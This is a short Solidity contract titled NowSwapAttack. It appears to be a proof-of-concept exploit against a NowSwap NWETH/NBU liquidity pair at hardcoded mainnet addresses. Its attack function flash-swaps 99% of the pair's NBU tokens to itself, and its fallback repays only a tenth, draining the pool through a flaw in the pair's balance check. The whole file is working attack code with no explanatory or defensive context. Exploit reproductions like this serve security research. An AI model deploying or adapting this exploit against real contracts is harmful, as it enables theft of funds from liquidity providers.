// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IERC20Custom {
    function transfer(address, uint256) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);
}

contract NowSwapAttack {
    address public pair = 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62; //NWETH/NBU
    address public nbu = 0xEB58343b36C7528F23CAAe63a150240241310049;

    function attack() external {
        uint256 amount = (IERC20(nbu).balanceOf(address(pair)) * 99) / 100;
        IUniswapV2Pair(pair).swap(0, amount, address(this), abi.encodePacked(amount));
    }

    fallback() external {
        IERC20Custom(nbu).transfer(pair, IERC20(nbu).balanceOf(address(this)) / 10);
    }
}
